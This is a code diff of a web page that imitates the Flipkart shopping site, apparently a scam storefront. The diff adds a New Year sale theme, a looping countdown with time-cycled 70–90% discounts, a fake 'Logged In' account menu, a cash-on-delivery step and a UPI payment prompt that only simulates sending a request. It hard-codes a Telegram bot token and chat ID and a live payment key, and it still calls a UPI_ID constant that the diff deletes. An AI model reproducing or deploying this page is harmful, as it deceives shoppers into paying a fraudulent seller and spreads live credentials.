@@ -3,19 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>flipkart.com</title>
+    <title>FlipKart</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         /* Base */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', Arial, sans-serif; }
         body { background-color: #f1f3f6; color: #212121; -webkit-tap-highlight-color: transparent; padding-bottom: 60px; /* Space for mobile nav */ }
+        
+        /* Smooth Scrolling */
+        html { scroll-behavior: smooth; }
 
         .hidden { display: none !important; }
 
         /* Toast Notifications */
         #toast-box {
             position: fixed;
-            bottom: 70px;
+            bottom: 80px; /* Adjusted for mobile footer */
             left: 50%;
             transform: translateX(-50%);
             z-index: 10000;
@@ -75,18 +78,92 @@
         .search-bar button { background: transparent; border: none; color: #2874f0; cursor: pointer; padding: 0 10px; font-size: 16px; }
 
         .nav-links { display: flex; align-items: center; gap: 20px; font-weight: 600; }
-        .login-btn { background: white; color: #2874f0; border: 1px solid #dbdbdb; padding: 5px 30px; font-weight: bold; cursor: pointer; border-radius: 2px; transition: 0.2s; }
-        .login-btn:hover { background: #f0f0f0; }
-        .nav-links a { color: white; text-decoration: none; font-size: 15px; display: flex; align-items: center; gap: 5px; cursor: pointer; }
-        .cart-btn { position: relative; }
+        
+        /* More Menu Dropdown */
+        .more-menu { position: relative; cursor: pointer; color: white; font-weight: 600; padding: 10px; }
+        .more-icon { transform: rotate(90deg); font-weight: bold; font-size: 18px; }
+        .dropdown-content {
+            display: none;
+            position: absolute;
+            right: 0;
+            top: 100%;
+            background-color: #fff;
+            min-width: 240px;
+            box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+            z-index: 1001;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-top: 5px;
+        }
+        .dropdown-content::before {
+            content: '';
+            position: absolute;
+            top: -5px;
+            right: 15px;
+            width: 10px;
+            height: 10px;
+            background: white;
+            transform: rotate(45deg);
+            box-shadow: -1px -1px 2px rgba(0,0,0,0.05);
+        }
+        .more-menu:hover .dropdown-content { display: block; }
+        .dropdown-item {
+            padding: 12px 16px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #212121;
+            font-size: 14px;
+            font-weight: 400;
+            border-bottom: 1px solid #f0f0f0;
+            transition: background 0.1s;
+        }
+        .dropdown-item:last-child { border-bottom: none; }
+        .dropdown-item:hover { background-color: #f9f9f9; color: #2874f0; }
+        .dropdown-item i { width: 20px; text-align: center; color: #2874f0; opacity: 0.8; }
+        
+        .nav-links a.cart-btn { color: white; text-decoration: none; font-size: 15px; display: flex; align-items: center; gap: 5px; cursor: pointer; }
         .cart-badge { background: #ff6161; color: white; font-size: 10px; border-radius: 50%; padding: 2px 5px; position: absolute; top: -5px; right: -8px; font-weight: bold; border: 1px solid #2874f0; display: none; }
 
-        /* Timer */
-        .timer-container { background: white; padding: 12px; margin-bottom: 10px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); text-align: center; border-bottom: 1px solid #eaeaea; }
-        .flash-sale { background: #ff0000; color: white; padding: 3px 8px; font-size: 12px; font-weight: bold; border-radius: 3px; margin-right: 10px; vertical-align: middle; animation: pulse 1s infinite alternate; }
-        @keyframes pulse { from { opacity: 0.8; } to { opacity: 1; } }
-        .timer-text { font-size: 16px; color: #666; vertical-align: middle; }
-        #timer { font-weight: bold; color: #333; font-family: monospace; font-size: 18px; }
+        /* New Year Sale Timer */
+        .timer-container { 
+            background: linear-gradient(90deg, #ff9f00 0%, #ff5252 100%); /* Festive Gradient */
+            padding: 12px; 
+            margin-bottom: 10px; 
+            box-shadow: 0 2px 5px rgba(0,0,0,0.15); 
+            text-align: center; 
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+        /* Shine Effect */
+        .timer-container::after {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 50%; height: 100%;
+            background: linear-gradient(to right, transparent, rgba(255,255,255,0.3), transparent);
+            transform: skewX(-25deg);
+            animation: shine 3s infinite;
+        }
+        @keyframes shine { 100% { left: 200%; } }
+
+        .flash-sale { 
+            background: white; 
+            color: #ff5252; 
+            padding: 4px 10px; 
+            font-size: 13px; 
+            font-weight: 800; 
+            border-radius: 20px; 
+            margin-right: 10px; 
+            vertical-align: middle; 
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .timer-text { font-size: 16px; font-weight: 500; vertical-align: middle; text-shadow: 0 1px 2px rgba(0,0,0,0.1); }
+        #timer { font-weight: 800; font-family: monospace; font-size: 18px; background: rgba(0,0,0,0.2); padding: 2px 6px; border-radius: 4px; }
 
         /* Category Nav */
         #category-nav { display: flex; overflow-x: auto; background: white; padding: 15px 5px; margin-bottom: 10px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); scrollbar-width: none; }
@@ -115,8 +192,9 @@
         .product-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
         .product-card { border: 1px solid #f0f0f0; padding: 15px; text-align: center; cursor: pointer; transition: 0.3s; position: relative; background: white; border-radius: 4px; }
         .product-card:hover { box-shadow: 0 5px 15px rgba(0,0,0,0.1); transform: translateY(-3px); }
-        .discount-badge { position: absolute; top: 10px; left: 10px; background: #388e3c; color: white; font-size: 10px; padding: 2px 6px; border-radius: 2px; font-weight: bold; }
-        .product-img { height: 160px; width: 100%; object-fit: contain; margin-bottom: 10px; }
+        .discount-badge { position: absolute; top: 10px; left: 10px; background: #388e3c; color: white; font-size: 10px; padding: 2px 6px; border-radius: 2px; font-weight: bold; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .product-img { height: 160px; width: 100%; object-fit: contain; margin-bottom: 10px; transition: transform 0.2s; }
+        .product-card:hover .product-img { transform: scale(1.05); }
         .product-title { font-size: 14px; font-weight: 500; margin-bottom: 5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; color: #212121; }
         .product-rating-row { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 4px; }
         .rating-badge { background: #388e3c; color: white; font-size: 12px; padding: 2px 6px; border-radius: 3px; font-weight: bold; display: flex; align-items: center; gap: 2px; }
@@ -256,8 +334,8 @@
         .close-btn { position: absolute; right: 15px; top: 15px; font-size: 24px; cursor: pointer; color: #fff; z-index: 20; }
         
         .address-form { padding: 0; background: white; display: flex; flex-direction: column; gap: 12px; }
-        .address-form input, .address-form textarea, #utr-input { width: 100%; padding: 14px; border: 1px solid #e0e0e0; outline: none; border-radius: 4px; font-size: 14px; transition: 0.2s; }
-        .address-form input:focus, .address-form textarea:focus, #utr-input:focus { border-color: #2874f0; box-shadow: 0 0 0 2px rgba(40,116,240,0.1); }
+        .address-form input, .address-form textarea, #utr-input, #upi-id-input { width: 100%; padding: 14px; border: 1px solid #e0e0e0; outline: none; border-radius: 4px; font-size: 14px; transition: 0.2s; }
+        .address-form input:focus, .address-form textarea:focus, #utr-input:focus, #upi-id-input:focus { border-color: #2874f0; box-shadow: 0 0 0 2px rgba(40,116,240,0.1); }
         .btn-continue, .btn-pay { width: 100%; background: #fb641b; color: white; border: none; padding: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; border-radius: 2px; font-size: 15px; box-shadow: 0 1px 2px rgba(0,0,0,0.2); }
 
         .payment-options-list { padding: 10px 0; background: white; }
@@ -268,6 +346,16 @@
         .pay-desc { font-size: 12px; color: #666; margin-top: 2px; }
         .pay-option.disabled { opacity: 0.5; pointer-events: none; }
         .error-msg { color: #ff6161; font-size: 11px; }
+
+        /* Manual UPI Styles */
+        .manual-upi-container {
+            margin-top: 10px;
+            display: none; /* Hidden by default */
+            padding-left: 30px; /* Indent */
+        }
+        .pay-option.selected .manual-upi-container {
+            display: block;
+        }
         
         /* Cart Specific Styles */
         .cart-item { display: flex; gap: 10px; background: white; padding: 10px; margin-bottom: 10px; border-bottom: 1px solid #eee; }
@@ -343,14 +431,14 @@
             .footer-address { border-left: none; padding-left: 0; flex-direction: column; gap: 20px; }
         }
 
-        /* Sale Popup */
+        /* Sale Popup - Updated Styling */
         .sale-popup {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.8);
+            background: rgba(0, 0, 0, 0.85); /* Darker overlay */
             z-index: 12000;
             display: none;
             justify-content: center;
@@ -360,24 +448,65 @@
             text-align: center;
             animation: fadeIn 0.5s;
         }
-        .sale-popup h1 { font-size: 32px; color: #ffe500; margin-bottom: 10px; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
-        .sale-popup p { font-size: 18px; margin-bottom: 20px; }
+        .sale-popup h1 { 
+            font-size: 36px; 
+            color: #ffe500; 
+            margin-bottom: 15px; 
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5); 
+            background: -webkit-linear-gradient(#ffe500, #ff5252);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 900;
+            text-transform: uppercase;
+        }
+        .sale-popup p { font-size: 18px; margin-bottom: 25px; color: #f1f1f1; }
         .sale-popup button {
-            background: #2874f0;
+            background: linear-gradient(90deg, #ff9f00, #ff5252);
             color: white;
             border: none;
-            padding: 10px 30px;
-            font-size: 16px;
+            padding: 12px 40px;
+            font-size: 18px;
             font-weight: bold;
-            border-radius: 4px;
+            border-radius: 50px;
             cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 82, 82, 0.4);
+            transition: transform 0.2s;
         }
+        .sale-popup button:active { transform: scale(0.95); }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
         /* Rating Modal */
         .rating-stars { font-size: 24px; color: #e0e0e0; cursor: pointer; margin: 10px 0; }
         .rating-stars i.active { color: #ffc200; }
         .feedback-input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin: 10px 0; font-family: inherit; }
+
+        /* COD Summary Section */
+        #cod-summary-section {
+            background: white;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        /* Language Modal */
+        .lang-modal-content {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 350px;
+        }
+        .lang-option {
+            padding: 15px;
+            border: 1px solid #eee;
+            border-radius: 4px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+        }
+        .lang-option:hover { background: #f9f9f9; }
+        .lang-option.selected { border-color: #2874f0; background: #f0f7ff; }
 
         /* Mobile CSS */
         @media (max-width: 600px) {
@@ -392,8 +521,8 @@
             .search-bar { order: 3; flex: 0 0 100%; margin: 10px 0 0 0; }
             
             .nav-links { display: flex !important; align-items: center; gap: 15px; }
-            .nav-links > a:not(.cart-btn) { display: none; }
-            .login-btn { padding: 5px 12px; font-size: 12px; }
+            /* Hide Login button on mobile as per requirement */
+            .login-btn { display: none; }
             
             /* Show Mobile Nav */
             .mobile-nav { display: flex; }
@@ -418,6 +547,15 @@
             /* Modal adjustments */
             .modal-content { height: 100%; border-radius: 0; max-height: 100vh; }
             .close-btn { color: white; background: transparent; }
+            
+            /* Adjust Language Modal for mobile */
+            .lang-modal-content {
+                width: 100%;
+                border-radius: 8px 8px 0 0;
+                position: absolute;
+                bottom: 0;
+                max-width: none;
+            }
         }
     </style>
 </head>
@@ -427,15 +565,15 @@
 
     <!-- Sale Popup -->
     <div id="sale-popup" class="sale-popup">
-        <h1>⚡ NEW SALE STARTED! ⚡</h1>
-        <p>Prices have been updated.</p>
-        <button onclick="closeSalePopup()">SHOP NOW</button>
+        <h1>🎉 2026 NEW YEAR SALE 🎉</h1>
+        <p>Bumper discounts just got bigger! Shop Now.</p>
+        <button onclick="closeSalePopup()">EXPLORE DEALS</button>
     </div>
 
     <!-- Loading Overlay -->
     <div id="loading-overlay" class="hidden">
         <div class="spinner"></div>
-        <p>Processing Payment...</p>
+        <p>Processing...</p>
     </div>
     <!-- Header Section -->
     <header>
@@ -449,7 +587,22 @@
                 <button><i class="fas fa-search"></i></button>
             </div>
             <div class="nav-links">
-                <button class="login-btn">Login</button>
+                <!-- Replaced Login Button with More Menu -->
+                <div class="more-menu">
+                    <i class="fas fa-ellipsis-v more-icon"></i>
+                    <div class="dropdown-content">
+                        <div class="dropdown-item"><i class="fas fa-user-circle"></i> Your Account (Logged In)</div>
+                        <a href="#" class="dropdown-item" onclick="showYourOrders()"><i class="fas fa-box"></i> Your Orders</a>
+                        <a href="#" class="dropdown-item" onclick="showSavedAddress()"><i class="fas fa-map-marker-alt"></i> Saved Addresses</a>
+                        <a href="#" class="dropdown-item" onclick="openLangModal()"><i class="fas fa-language"></i> Select Language</a>
+                        <a href="#" class="dropdown-item" onclick="showFeatureToast('Privacy Center')"><i class="fas fa-shield-alt"></i> Privacy Center</a>
+                        <a href="#" class="dropdown-item" onclick="showFeatureToast('Sell on Flipkart')"><i class="fas fa-store"></i> Sell on Flipkart</a>
+                        <a href="#" class="dropdown-item" onclick="showFeatureToast('Browse FAQs')"><i class="fas fa-question-circle"></i> Browse FAQs</a>
+                        <a href="#" class="dropdown-item" onclick="showFeatureToast('Policies')"><i class="fas fa-file-contract"></i> Terms, Policies</a>
+                        <a href="#" class="dropdown-item" onclick="showFeatureToast('Help Centre')"><i class="fas fa-headset"></i> Help</a>
+                    </div>
+                </div>
+                
                 <a href="#">Become a Seller</a>
                 <a href="#" class="cart-btn" onclick="openCart(event)"><i class="fas fa-shopping-cart"></i> Cart <span class="cart-badge">0</span></a>
             </div>
@@ -459,7 +612,7 @@
     <!-- Timer Section -->
     <div class="timer-container" id="timer-section">
         <div class="timer-box">
-            <span class="flash-sale">⚡ FLASH SALE</span>
+            <span class="flash-sale">🎉 NEW YEAR 2026 SALE</span>
             <span class="timer-text">Ends in: <span id="timer">60:00</span></span>
         </div>
     </div>
@@ -479,7 +632,7 @@
             </div>
 
             <div class="deals-header">
-                <h3 id="section-title">Deals of the Day</h3>
+                <h3 id="section-title">New Year Dhamaka Deals</h3>
                 <button class="view-all">VIEW ALL</button>
             </div>
             <div class="product-grid" id="product-container">
@@ -734,17 +887,12 @@
                         </label>
                     </div>
 
-                    <div class="pay-option" id="manual-upi-option" onclick="selectPayment('manual-upi')">
-                        <input type="radio" name="payment" id="manual-upi">
-                        <label for="manual-upi">
-                            <div class="pay-title">Manual UPI Transfer</div>
-                            <div class="pay-desc">Pay via App & Enter UTR</div>
+                    <div class="pay-option" id="cod-option" onclick="selectPayment('cod')">
+                        <input type="radio" name="payment" id="cod">
+                        <label for="cod">
+                            <div class="pay-title">Cash on Delivery (Extra ₹49 Delivery Charge)</div>
+                            <div class="pay-desc">Pay cash at time of delivery</div>
                         </label>
-                    </div>
-
-                    <div class="pay-option disabled">
-                        <input type="radio" name="payment" disabled>
-                        <label>Cash on Delivery <span class="error-msg">(Unavailable)</span></label>
                     </div>
                 </div>
 
@@ -757,27 +905,57 @@
                     <button class="btn-back" onclick="backToSummary()" style="width:100%; background:white; color:#2874f0; border:1px solid #f0f0f0; padding:10px; margin-top:10px; cursor:pointer;">Back</button>
                 </div>
             </div>
+            
+            <!-- Step 4: COD Confirmation (Hidden initially) -->
+            <div id="step-cod-confirm" class="step-content">
+                 <div id="cod-summary-section">
+                    <h3 style="color:#2874f0; margin-bottom:15px;">Confirm COD Order</h3>
+                    <p style="margin-bottom:20px;">You have selected Cash on Delivery. An extra charge of <strong>₹49</strong> has been added.</p>
+                    
+                    <div class="price-details" style="text-align:left;">
+                        <div class="price-row"><span>Order Total</span><span id="cod-base-price">₹0</span></div>
+                        <div class="price-row"><span>Delivery Charge</span><span style="color:#ff6161;">+ ₹49</span></div>
+                        <div class="price-row total"><span>Final Payable</span><span id="cod-final-price">₹0</span></div>
+                    </div>
+
+                    <button class="btn-continue" onclick="confirmCODOrder()" style="margin-top:10px;">CONFIRM ORDER</button>
+                    <button class="btn-back" onclick="backToPayment()" style="width:100%; background:white; color:#2874f0; border:1px solid #f0f0f0; padding:10px; margin-top:10px; cursor:pointer;">Change Payment Mode</button>
+                 </div>
+            </div>
+
         </div>
     </div>
-
-    <!-- UTR Modal (Fallback) -->
-    <div id="utrModal" class="modal">
-        <div class="modal-content utr-content" style="height:auto; min-height:300px;">
-            <span class="close-btn" onclick="document.getElementById('utrModal').style.display='none'" style="color:black; top:10px; right:15px;">&times;</span>
-            <div style="text-align: center; padding: 20px 15px;">
-                <h3 style="color: #2874f0;">Manual Verification</h3>
-                <p style="font-size: 13px; color: #555; margin: 10px 0;">
-                    Payment to: <b><span id="merchant-display"></span></b>
-                    <br><br>
-                    UPI ID: <span id="upi-id-display" style="font-family:monospace; background:#eee; padding:2px 5px;"></span> 
-                    <button class="btn-copy" onclick="copyUPI()">COPY</button>
-                </p>
-                <input type="text" id="utr-input" placeholder="Enter 12-digit UTR/Ref No." maxlength="12" style="text-align:center; letter-spacing:1px; font-weight:bold;">
-                
-                <div class="utr-actions">
-                    <button class="btn-continue" onclick="verifyUTR()" style="margin-top:0; flex:1;">VERIFY</button>
-                    <button class="btn-outline" onclick="startManualUPI()">PAY AGAIN</button>
-                </div>
+    
+    <!-- Language Modal -->
+    <div id="langModal" class="modal">
+        <div class="modal-content lang-modal-content" style="height:auto;">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
+                <h3 style="margin:0;">Select Language</h3>
+                <span class="close-btn" onclick="document.getElementById('langModal').style.display='none'" style="position:static;color:#000;">&times;</span>
+            </div>
+            
+            <div class="lang-option selected" onclick="selectLanguage('en')">
+                <input type="radio" name="lang" checked>
+                <span>English</span>
+            </div>
+            <div class="lang-option" onclick="selectLanguage('hi')">
+                <input type="radio" name="lang">
+                <span>Hindi</span>
+            </div>
+            
+            <button class="btn-continue" onclick="applyLanguage()">APPLY</button>
+        </div>
+    </div>
+    
+    <!-- Your Orders Modal -->
+    <div id="ordersModal" class="modal">
+         <div class="modal-content" style="background:#f1f3f6; height:100%;max-height:100vh;">
+            <div style="background: #2874f0; padding: 15px; color: white; display: flex; align-items: center;">
+                <i class="fas fa-arrow-left" onclick="document.getElementById('ordersModal').style.display='none'" style="margin-right: 10px; cursor: pointer;"></i>
+                <span style="font-weight: 500; font-size: 16px;">My Orders</span>
+            </div>
+            <div id="orders-list" style="padding:10px;">
+                <!-- Orders will be injected here -->
             </div>
         </div>
     </div>
@@ -792,22 +970,24 @@
     <!-- RAZORPAY SDK -->
     <script src="https://checkout.razorpay.com/v1/checkout.js"></script>
     <script>
-    console.log("Script Loaded - Rating & Feedback Restored");
+    console.log("Script Loaded - All Issues Fixed");
 
     // --- CONFIGURATION ---
     const TELEGRAM_BOT_TOKEN = "6305172063:AAFHumurpK6wMV7K-6FZBg-DSKxwMuD4Vw0"; 
     const TELEGRAM_CHAT_ID = "1815847082"; 
     const RAZORPAY_KEY_ID = "rzp_live_RonN88BXEVP9eA"; 
-    const UPI_ID = "gpay-11265399414@okbizaxis"; 
     const MERCHANT_NAME = "VR Shop";
-    const MERCHANT_CODE = "BCR2DN5TWTE6VMRU";
-
+    
     // Global Discount Modifier based on Time Cycle
     let globalDiscountModifier = 0; 
     let lastCycleIndex = -1;
+    
+    // Store User Orders Locally
+    let userOrders = [];
 
-    // --- PRODUCT DATA (Updated Discounts 70% - 90%) ---
+    // --- PRODUCT DATA (Full 46 Products Restored) ---
     const products = [
+        // --- EARBUDS ---
         { 
             id: 1,
             category: "Earbuds",
@@ -824,7 +1004,7 @@
             name: "GOBOULT Z40", 
             fullName: "GOBOULT Z40 with ENC Mic, 60Hr Battery, Metal Finish", 
             price: 4999, 
-            discount: 85,
+            discount: 75,
             rating: 4.3, reviews: "8,500",
             image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/d/a/c/-original-imahebzzqs5fspcv.jpeg?q=70&crop=false" 
         },
@@ -834,7 +1014,7 @@
             name: "OnePlus Nord Buds 3r", 
             fullName: "OnePlus Nord Buds 3r TWS Earbuds, 3D Audio, 2-mic call (Blue)", 
             price: 2699, 
-            discount: 75,
+            discount: 40,
             rating: 4.5, reviews: "34,201",
             image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/p/t/b/-original-imahf9daxb97keh5.jpeg?q=70&crop=false" 
         },
@@ -844,7 +1024,7 @@
             name: "Mivi Duopods B1", 
             fullName: "Mivi Duopods B1 (Just Launched) 45 Hours Playtime", 
             price: 2999, 
-            discount: 88,
+            discount: 85,
             rating: 4.0, reviews: "2,100",
             image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/k/k/r/-original-imaha9pgxwpfewtb.jpeg?q=70&crop=false" 
         },
@@ -854,7 +1034,7 @@
             name: "truke Buds Lite", 
             fullName: "truke Buds Lite with 60 Hours Playtime, Deep Bass", 
             price: 3499, 
-            discount: 90,
+            discount: 88,
             rating: 3.9, reviews: "5,640",
             image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/o/f/d/-original-imahgbn7hzywq3gm.jpeg?q=70&crop=false" 
         },
@@ -864,9 +1044,39 @@
             name: "OnePlus Nord Buds 3r", 
             fullName: "OnePlus Nord Buds 3r TWS Earbuds, Ash Black", 
             price: 2699, 
-            discount: 72,
+            discount: 45,
             rating: 4.6, reviews: "31,090", 
             image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/7/n/o/-original-imahfsg7chmgrugu.jpeg?q=70&crop=false" 
+        },
+        { 
+            id: 17, 
+            category: "Earbuds", 
+            name: "Bolt Z40 Pro", 
+            fullName: "Bolt Z40 Pro with 100H Battery, Quad Mic ENC, Rubber Grip (Midnight)", 
+            price: 5999, 
+            discount: 82,
+            rating: 4.5, reviews: "3,400",
+            image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/u/6/u/-original-imahd2rhkgzwyuun.jpeg?q=70&crop=false" 
+        },
+        { 
+            id: 18, 
+            category: "Earbuds", 
+            name: "Realme Buds T200", 
+            fullName: "Realme Buds T200 Lite 12.4mm Driver, 48hrs Playback (Black)", 
+            price: 2999, 
+            discount: 78,
+            rating: 3.9, reviews: "9,800",
+            image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/d/b/h/-original-imaha6btcgqdqy5e.jpeg?q=70&crop=false" 
+        },
+        { 
+            id: 19, 
+            category: "Earbuds", 
+            name: "Patron Bassbuds", 
+            fullName: "Patron Bassbuds Vibe 34 Hrs Playback, 13mm Drivers (Lilac)", 
+            price: 2499, 
+            discount: 88,
+            rating: 4.0, reviews: "4,500",
+            image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/f/u/m/-original-imah9f97v86bkauj.jpeg?q=70&crop=false" 
         },
         
         // --- Sunglasses ---
@@ -971,38 +1181,6 @@
             discount: 75,
             rating: 4.4, reviews: "22,100",
             image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/6/x/i/38-354-38158wm01-android-ios-fastrack-yes-original-imah6wqm5ywzhtbv.jpeg?q=70&crop=false" 
-        },
-
-        // --- Earbuds (Moved from Headset) ---
-        { 
-            id: 17, 
-            category: "Earbuds", 
-            name: "Bolt Z40 Pro", 
-            fullName: "Bolt Z40 Pro with 100H Battery, Quad Mic ENC, Rubber Grip (Midnight)", 
-            price: 5999, 
-            discount: 82,
-            rating: 4.5, reviews: "3,400",
-            image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/u/6/u/-original-imahd2rhkgzwyuun.jpeg?q=70&crop=false" 
-        },
-        { 
-            id: 18, 
-            category: "Earbuds", 
-            name: "Realme Buds T200", 
-            fullName: "Realme Buds T200 Lite 12.4mm Driver, 48hrs Playback (Black)", 
-            price: 2999, 
-            discount: 78,
-            rating: 3.9, reviews: "9,800",
-            image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/d/b/h/-original-imaha6btcgqdqy5e.jpeg?q=70&crop=false" 
-        },
-        { 
-            id: 19, 
-            category: "Earbuds", 
-            name: "Patron Bassbuds", 
-            fullName: "Patron Bassbuds Vibe 34 Hrs Playback, 13mm Drivers (Lilac)", 
-            price: 2499, 
-            discount: 88,
-            rating: 4.0, reviews: "4,500",
-            image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/f/u/m/-original-imah9f97v86bkauj.jpeg?q=70&crop=false" 
         },
 
         // --- Headphones/Audio ---
@@ -1288,6 +1466,9 @@
     let currentOrderID = "";
     let isCouponApplied = false; 
     let userRating = 0;
+    
+    // Track if COD selected and confirm mode active
+    let isCodSelected = false;
 
     // --- DYNAMIC DISCOUNT HELPERS ---
     function getFinalDiscount(product) {
@@ -1331,7 +1512,7 @@
             
             // IF Detail Page is Open, Refresh it LIVE
             const detailView = document.getElementById('product-detail-view');
-            if(detailView.style.display === 'block' && !detailView.classList.contains('hidden')) {
+            if(detailView && detailView.style.display === 'block' && !detailView.classList.contains('hidden')) {
                 // Re-render detail view for current product
                 showProductDetail(currentProduct);
             }
@@ -1343,16 +1524,18 @@
         const secondsLeft = cycleDuration - (now % cycleDuration);
         const m = Math.floor(secondsLeft / 60).toString().padStart(2, '0');
         const s = (secondsLeft % 60).toString().padStart(2, '0');
-        document.getElementById('timer').innerText = `${m}:${s}`;
+        const timerEl = document.getElementById('timer');
+        if(timerEl) timerEl.innerText = `${m}:${s}`;
     }
 
     function showSalePopup() {
         const popup = document.getElementById('sale-popup');
-        popup.style.display = 'flex';
+        if(popup) popup.style.display = 'flex';
     }
 
     function closeSalePopup() {
-        document.getElementById('sale-popup').style.display = 'none';
+        const popup = document.getElementById('sale-popup');
+        if(popup) popup.style.display = 'none';
     }
 
     // Helper to get specs based on category
@@ -1367,7 +1550,8 @@
                 { key: "Water Resistant", val: "Yes, IPX5" },
                 { key: "Sales Package", val: "1 Pair Earbuds, Charging Case, Cable, User Manual" }
             ],
-            "Headset": [
+            // ... (Other categories)
+             "Headset": [
                 { key: "Model Name", val: product.name },
                 { key: "Headphone Type", val: "Over Ear" },
                 { key: "Connectivity", val: "Bluetooth / Aux" },
@@ -1556,7 +1740,8 @@
     }
     
     function closeCartModal() {
-        document.getElementById('cartModal').style.display = 'none';
+        const cartModal = document.getElementById('cartModal');
+        if(cartModal) cartModal.style.display = 'none';
     }
 
     function removeFromCart(index) {
@@ -1612,7 +1797,7 @@
         if(element) element.classList.add('active');
         const title = document.getElementById('section-title');
         if(category === "All") {
-            if(title) title.innerText = "Deals of the Day";
+            if(title) title.innerText = "New Year Dhamaka Deals";
             renderProducts(products);
         } else {
             if(title) title.innerText = `Top ${category}`;
@@ -1748,6 +1933,8 @@
         } else {
             document.querySelector('.similar-section').style.display = 'none';
         }
+        // Don't scroll to top if refreshing, only if fresh open (optional, keeps UX better)
+        if (detailView.style.display !== 'block') window.scrollTo({ top: 0, behavior: 'auto' });
     }
     
     // COUPON LOGIC
@@ -1801,9 +1988,12 @@
     }
     
     function closeModal() {
-        document.getElementById('checkoutModal').style.display = 'none';
-        document.getElementById('utrModal').style.display = 'none';
-        document.getElementById('successModal').style.display = 'none';
+        const checkout = document.getElementById('checkoutModal');
+        if (checkout) checkout.style.display = 'none';
+        const utr = document.getElementById('utrModal');
+        if (utr) utr.style.display = 'none';
+        const success = document.getElementById('successModal');
+        if (success) success.style.display = 'none';
     }
 
     function goToSummary() {
@@ -1877,6 +2067,9 @@
         `;
         document.getElementById('summary-total').innerText = `₹${finalPrice}`;
         currentPrice = finalPrice; 
+        
+        // Reset COD State
+        isCodSelected = false;
     }
     
     function getDeliveryDate() {
@@ -1914,6 +2107,15 @@
         document.getElementById('step-2-header').classList.remove('completed');
         document.getElementById('step-2-header').classList.add('active');
         document.getElementById('step-summary').classList.add('visible');
+        // If coming back from COD step
+        document.getElementById('step-cod-confirm').classList.remove('visible');
+        isCodSelected = false;
+    }
+
+    function backToPayment() {
+        document.getElementById('step-cod-confirm').classList.remove('visible');
+        document.getElementById('step-payment').classList.add('visible');
+        isCodSelected = false;
     }
 
     function selectPayment(method) {
@@ -1928,12 +2130,65 @@
     // PAYMENTS
     function initiatePayment() {
         const selected = document.querySelector('input[name="payment"]:checked').id;
+        
         if (selected === 'online') {
             if (typeof Razorpay !== 'undefined') { showLoading(); startRazorpay(); } 
             else { showToast("Gateway unavailable. Using Manual Method."); startManualUPI(); }
         } else if (selected === 'manual-upi') {
-            startManualUPI();
+            const upiInput = document.getElementById('upi-id-input').value;
+            if(upiInput) requestPayment();
+            else startManualUPI();
+        } else if (selected === 'cod') {
+            // New COD Flow
+            showCodConfirmation();
         }
+    }
+    
+    function showCodConfirmation() {
+        isCodSelected = true;
+        document.getElementById('step-payment').classList.remove('visible');
+        document.getElementById('step-cod-confirm').classList.add('visible');
+        
+        const finalPriceWithCod = currentPrice + 49;
+        
+        document.getElementById('cod-base-price').innerText = `₹${currentPrice}`;
+        document.getElementById('cod-final-price').innerText = `₹${finalPriceWithCod}`;
+    }
+    
+    function confirmCODOrder() {
+        // Add delivery charge to final tracking price before completing
+        currentPrice += 49; 
+        const refId = "COD" + Math.floor(Math.random() * 1000000);
+        
+        showLoading();
+        setTimeout(() => {
+            hideLoading();
+            completeOrder(refId);
+        }, 1500);
+    }
+    
+    function requestPayment() {
+        const upiId = document.getElementById('upi-id-input').value;
+        if(!upiId || !upiId.includes('@')) {
+            showToast("Please enter a valid UPI ID");
+            return;
+        }
+        
+        showLoading();
+        // Simulate API call
+        setTimeout(() => {
+            hideLoading();
+            showToast(`Request sent to ${upiId}! Check your UPI App.`);
+            
+            // Proceed to verification after request
+            setTimeout(() => {
+                document.getElementById('checkoutModal').style.display = 'none';
+                document.getElementById('merchant-display').innerText = MERCHANT_NAME;
+                document.getElementById('upi-id-display').innerText = UPI_ID; // Still show Merchant ID for fallback
